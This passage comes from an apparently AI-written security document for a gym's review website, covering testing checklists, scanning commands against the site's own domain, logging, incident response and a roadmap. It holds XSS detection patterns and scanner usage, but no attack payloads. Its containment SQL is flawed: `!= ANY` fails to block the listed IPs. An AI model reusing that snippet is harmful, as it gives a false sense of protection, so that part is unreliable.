**When Authentication Is Implemented:**
- Session hijacking (use httpOnly cookies)
- Credential stuffing (implement account lockout)
- Password reset exploitation (use secure tokens)
- Privilege escalation (proper role checks)

**When File Upload Is Added:**
- Malicious file uploads (validate mime types, scan files)
- Path traversal (sanitize filenames)
- Storage exhaustion (implement quotas)

**When Payment Is Implemented:**
- Payment fraud (use reputable gateway)
- PCI DSS compliance (never store card data)
- Transaction replay attacks (use nonces)

---

## 14. Security Testing & Monitoring

### 14.1 Testing Checklist

**Input Validation Testing:**
- [ ] Submit XSS payloads in all text fields
- [ ] Submit SQL injection strings
- [ ] Submit oversized inputs (>1000 chars)
- [ ] Submit non-UTF8 characters
- [ ] Submit null/undefined values
- [ ] Submit special characters (@#$%^&*)

**Authentication Testing** (When Implemented):
- [ ] Attempt login with invalid credentials
- [ ] Attempt registration with existing email
- [ ] Test password reset flow
- [ ] Verify session timeout
- [ ] Test concurrent sessions
- [ ] Attempt token manipulation

**Authorization Testing:**
- [ ] Access reviews without authentication (should work)
- [ ] Attempt direct table access (should fail)
- [ ] Query ip_address via view (should return null)
- [ ] Bypass RLS policies (should fail)

**Rate Limiting Testing:**
- [ ] Submit 2 reviews rapidly (should block 2nd)
- [ ] Submit from different IPs (should allow)
- [ ] Wait 7 days and resubmit (should allow)

**Security Headers Testing:**
```bash
# Check headers
curl -I https://brothersgym-kazanlak.bg

# Verify CSP
curl -I https://brothersgym-kazanlak.bg | grep Content-Security-Policy

# Test HSTS
curl -I https://brothersgym-kazanlak.bg | grep Strict-Transport-Security
```

**CSP Testing:**
- [ ] Attempt to load external script (should block)
- [ ] Attempt inline event handlers (should block)
- [ ] Verify allowed sources load correctly

**HTTPS Testing:**
```bash
# Check SSL certificate
openssl s_client -connect brothersgym-kazanlak.bg:443 -servername brothersgym-kazanlak.bg

# Verify TLS version
nmap --script ssl-enum-ciphers -p 443 brothersgym-kazanlak.bg
```

### 14.2 Automated Security Scanning

**Recommended Tools:**

1. **OWASP ZAP** - Web application security scanner
   ```bash
   docker run -t owasp/zap2docker-stable zap-baseline.py \
     -t https://brothersgym-kazanlak.bg
   ```

2. **npm audit** - Dependency vulnerability scanning
   ```bash
   npm audit
   npm audit fix
   ```

3. **Snyk** - Continuous security monitoring
   ```bash
   npx snyk test
   npx snyk monitor
   ```

4. **Mozilla Observatory** - Web security checker
   - Visit: https://observatory.mozilla.org
   - Enter: brothersgym-kazanlak.bg

5. **Security Headers** - Header checker
   - Visit: https://securityheaders.com
   - Enter: brothersgym-kazanlak.bg

### 14.3 Monitoring & Logging

**Current Logging:**
```typescript
// Edge Function logs
console.log('Review submission from IP:', clientIp);
console.log('Review submitted successfully:', data.id);
console.error('Error inserting review:', error);
```

**Recommended Enhancements:**

**Structured Logging:**
```typescript
const log = {
  timestamp: new Date().toISOString(),
  event: 'review_submitted',
  ip: clientIp,
  user_agent: req.headers.get('user-agent'),
  review_id: data.id,
  rating: data.rating
};
console.log(JSON.stringify(log));
```

**Security Event Logging:**
```typescript
// Log rate limit violations
if (rateLimited) {
  console.warn(JSON.stringify({
    event: 'rate_limit_exceeded',
    ip: clientIp,
    timestamp: new Date().toISOString()
  }));
}

// Log validation failures
if (!isValid) {
  console.warn(JSON.stringify({
    event: 'validation_failed',
    field: 'name',
    value: sanitized_value,
    ip: clientIp
  }));
}
```

**Recommended Monitoring:**
- Supabase Dashboard - Database metrics, query performance
- Netlify Analytics - Traffic, errors, performance
- Custom alerts for:
  - Unusual traffic spikes
  - High rate of validation failures
  - Database connection issues
  - Edge Function errors

---

## 15. Incident Response

### 15.1 Security Incident Response Plan

**Phase 1: Detection**
- Monitor logs for anomalies
- Alert on suspicious patterns
- User reports of issues

**Phase 2: Containment**
```typescript
// Immediate actions for compromised review system:
// 1. Disable Edge Function
[functions.submit-review]
verify_jwt = true  # Require auth temporarily

// 2. Block suspicious IPs in RLS policy
CREATE POLICY "Block malicious IPs"
  ON reviews
  FOR ALL
  USING (ip_address != ANY(ARRAY['attacker_ip_1', 'attacker_ip_2']));

// 3. Rate limit tightening
const ONE_DAY = 86400000; // Reduce from 7 days
```

**Phase 3: Investigation**
```sql
-- Find suspicious reviews
SELECT * FROM reviews 
WHERE created_at > NOW() - INTERVAL '24 hours'
ORDER BY created_at DESC;

-- Check for patterns
SELECT ip_address, COUNT(*) as count
FROM reviews
GROUP BY ip_address
HAVING COUNT(*) > 5;

-- Identify malicious content
SELECT * FROM reviews 
WHERE comment LIKE '%<script%' 
   OR comment LIKE '%javascript:%'
   OR comment LIKE '%onerror%';
```

**Phase 4: Eradication**
```sql
-- Remove malicious reviews
DELETE FROM reviews 
WHERE id IN (suspicious_review_ids);

-- Clean up attack artifacts
DELETE FROM reviews 
WHERE ip_address IN (malicious_ips);
```

**Phase 5: Recovery**
- Restore Edge Function with enhanced validation
- Apply additional security measures
- Monitor closely for 72 hours

**Phase 6: Lessons Learned**
- Document incident timeline
- Update security measures
- Enhance monitoring
- Train on new threats

### 15.2 Contact Information

**Security Issues:**
- **Email**: [gym contact email]
- **Phone**: 089 678 0067 (Дориан), 089 445 0256 (Тенчо)
- **Response Time**: 24-48 hours

**Responsible Disclosure:**
If you discover a security vulnerability, please:
1. Do NOT exploit it or disclose publicly
2. Contact via email with details
3. Allow reasonable time for fix (90 days standard)
4. Provide proof of concept if possible

**Bug Bounty:** Not currently offered (future consideration)

### 15.3 Data Breach Response

**In case of database breach:**

1. **Immediate Actions:**
   - Rotate all API keys and database credentials
   - Enable additional RLS policies
   - Review access logs
   - Preserve evidence

2. **Assessment:**
   - Identify scope of breach (what data accessed?)
   - Determine impact (how many users affected?)
   - Classify severity

3. **Notification:**
   - Notify affected users (if applicable)
   - Report to authorities if required by GDPR (72 hours)
   - Public disclosure if necessary

4. **Remediation:**
   - Patch vulnerability
   - Enhance security measures
   - Conduct security audit
   - Update documentation

**GDPR Breach Notification Threshold:**
- Personal data involved: Name, IP address
- Risk assessment required
- Notification may be required if high risk to users

---

## 16. Security Roadmap

### 16.1 Current Security Posture

**Maturity Level:** **Intermediate**

**Strengths:**
- ✅ Comprehensive input validation and sanitization
- ✅ Strong security headers (CSP, HSTS, etc.)
- ✅ RLS policies protecting sensitive data
- ✅ Server-side rate limiting
- ✅ GDPR-compliant architecture
- ✅ Multi-layer defense approach

**Gaps:**
- ⚠️ No authentication (infrastructure ready, not implemented)
- ⚠️ No CAPTCHA (vulnerable to determined attackers)
- ⚠️ No automated security scanning in CI/CD
- ⚠️ No centralized security logging
- ⚠️ No security monitoring/alerts
- ⚠️ CSP uses `unsafe-inline` and `unsafe-eval`

### 16.2 Short-Term Improvements (1-3 Months)

**Priority 1: Add CAPTCHA**
```typescript
// Add reCAPTCHA to review form
import ReCAPTCHA from "react-google-recaptcha";

<ReCAPTCHA
  sitekey="your_site_key"
  onChange={handleCaptchaChange}
/>
```

**Priority 2: Implement Authentication**
- User registration and login
- Email verification
- Password reset flow
- Session management

**Priority 3: Enhanced Monitoring**
- Structured logging
- Error tracking (Sentry integration)
- Security event alerts
- Dashboard for metrics

**Priority 4: Stricter CSP**
```typescript
// Remove unsafe-inline/unsafe-eval in production
// Use nonces for inline scripts
<script nonce={generateNonce()}>
  // inline code
</script>
```

### 16.3 Medium-Term Improvements (3-6 Months)

**User Management Features:**
- Role-based access control (admin, coach, member)
- Admin dashboard for review moderation
- User profiles with security settings
- Two-factor authentication (2FA)

**Advanced Rate Limiting:**
- Progressive delays
- CAPTCHA after failed attempts
- Geolocation-based anomaly detection
- Token bucket algorithm

**Security Automation:**
- Automated security testing in CI/CD
- Dependency scanning
- Container scanning (if applicable)
- Infrastructure as Code security

### 16.4 Long-Term Improvements (6-12 Months)

**Advanced Security Features:**
- Web Application Firewall (WAF)
- DDoS protection (beyond hosting provider)
- Bot detection and mitigation
- Fraud detection for payments
- Behavioral analytics

**Compliance:**
- Security audit by third party
- Penetration testing
- ISO 27001 considerations (if scaling)
- SOC 2 compliance (if B2B services added)

**Monitoring & Response:**
- Security Operations Center (SOC) procedures
- Incident response team
- Security training for staff
- Regular security reviews

---

## Appendix A: Security Glossary

**RLS (Row Level Security):** Database feature that restricts row access based on user policies

**CSP (Content Security Policy):** HTTP header that prevents XSS by restricting resource sources

**HSTS (HTTP Strict Transport Security):** Forces HTTPS connections for a domain

**XSS (Cross-Site Scripting):** Injection attack where malicious scripts run in user's browser

**CSRF (Cross-Site Request Forgery):** Attack that tricks user into executing unwanted actions

**SQL Injection:** Attack that inserts malicious SQL code into application queries

**PII (Personally Identifiable Information):** Data that can identify an individual

**GDPR (General Data Protection Regulation):** EU privacy law protecting personal data

**JWT (JSON Web Token):** Compact token format for securely transmitting information

**CORS (Cross-Origin Resource Sharing):** Mechanism allowing restricted resources to be requested from another domain

**DOMPurify:** Library for sanitizing HTML and preventing XSS attacks

**Supabase:** Open-source Firebase alternative with PostgreSQL database

**Edge Functions:** Serverless functions running close to users for low latency

**Rate Limiting:** Restricting the number of requests a user can make in a time period

**Clickjacking:** Attack that tricks users into clicking hidden elements

**MITM (Man-in-the-Middle):** Attack where attacker intercepts communication

**TLS (Transport Layer Security):** Cryptographic protocol for secure communication

**UUID:** Universally Unique Identifier, non-sequential ID format

---

## Appendix B: Security Checklist

### Development Checklist

- [ ] All user inputs validated client-side
- [ ] All user inputs validated server-side
- [ ] All user inputs sanitized (DOMPurify)
- [ ] SQL queries use parameterized queries
- [ ] No sensitive data in client-side code
- [ ] No secrets committed to Git
- [ ] Error messages are generic (no stack traces)
- [ ] Logging excludes sensitive data
- [ ] Dependencies are up to date
- [ ] Security headers configured
- [ ] CSP implemented and tested
- [ ] HTTPS enforced
- [ ] HSTS configured
- [ ] RLS policies on all tables
- [ ] Authentication uses industry standards
- [ ] Passwords hashed with bcrypt/argon2
- [ ] Rate limiting implemented
- [ ] CORS configured correctly
- [ ] No `eval()` or `Function()` with user input
- [ ] No `dangerouslySetInnerHTML` with user input
- [ ] Input length limits enforced
- [ ] File upload validation (if applicable)

### Deployment Checklist

- [ ] Environment variables set correctly
- [ ] Database migrations applied
- [ ] RLS policies enabled
- [ ] Edge Functions deployed
- [ ] Security headers verified (securityheaders.com)
- [ ] CSP verified (csp-evaluator.withgoogle.com)
- [ ] SSL certificate valid
- [ ] HSTS working (hstspreload.org)
- [ ] Subdomain security configured
- [ ] Monitoring set up
- [ ] Logging configured
- [ ] Backup strategy in place
- [ ] Incident response plan documented
- [ ] Security contacts updated

### Periodic Review Checklist (Monthly)

- [ ] Review access logs for anomalies
- [ ] Check for failed login attempts (when auth added)
- [ ] Review CSP violation reports
- [ ] Update dependencies (`npm audit`)
- [ ] Review rate limiting effectiveness
- [ ] Check for new security advisories
- [ ] Test backup restoration
- [ ] Review RLS policies
- [ ] Audit user roles and permissions (when auth added)
- [ ] Review Edge Function logs

---

## Appendix C: Useful Commands

### Security Testing Commands

```bash
# Check security headers
curl -I https://brothersgym-kazanlak.bg

# Test CSP
curl -I https://brothersgym-kazanlak.bg | grep -i "content-security-policy"

# Check HSTS
curl -I https://brothersgym-kazanlak.bg | grep -i "strict-transport-security"

# SSL certificate check
openssl s_client -connect brothersgym-kazanlak.bg:443 -servername brothersgym-kazanlak.bg

# SSL expiry date
echo | openssl s_client -servername brothersgym-kazanlak.bg -connect brothersgym-kazanlak.bg:443 2>/dev/null | openssl x509 -noout -dates

# Check for vulnerable dependencies
npm audit

# Fix vulnerable dependencies
npm audit fix

# Check outdated packages
npm outdated

# Security scan with OWASP ZAP
docker run -t owasp/zap2docker-stable zap-baseline.py -t https://brothersgym-kazanlak.bg

# Check DNS records
dig brothersgym-kazanlak.bg
nslookup brothersgym-kazanlak.bg

# Check TLS configuration
nmap --script ssl-enum-ciphers -p 443 brothersgym-kazanlak.bg

# Check HTTP methods allowed
curl -X OPTIONS -I https://brothersgym-kazanlak.bg
```

### Database Security Commands

```sql
-- Check RLS status
SELECT schemaname, tablename, rowsecurity 
FROM pg_tables 
WHERE schemaname = 'public';

-- View RLS policies
SELECT * FROM pg_policies WHERE schemaname = 'public';

-- Check table permissions
SELECT grantee, privilege_type 
FROM information_schema.role_table_grants 
WHERE table_name='reviews';

-- Find tables without RLS
SELECT tablename 
FROM pg_tables 
WHERE schemaname = 'public' 
  AND tablename NOT IN (
    SELECT tablename FROM pg_tables WHERE rowsecurity = true
  );

-- Audit recent database changes
SELECT * FROM reviews 
WHERE created_at > NOW() - INTERVAL '24 hours' 
ORDER BY created_at DESC;
```

---

## Document Control

**Version History:**

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0.0 | 2025-11-24 | AI Assistant | Initial comprehensive security documentation |

**Review Schedule:**
- Minor updates: As changes occur
- Major review: Quarterly
- Full audit: Annually

**Document Owner:** Brothers Gym Kazanlak Technical Team

**Classification:** Internal Use (Can be shared with security auditors)

**Last Reviewed:** 2025-11-24

---

**END OF SECURITY DOCUMENTATION**
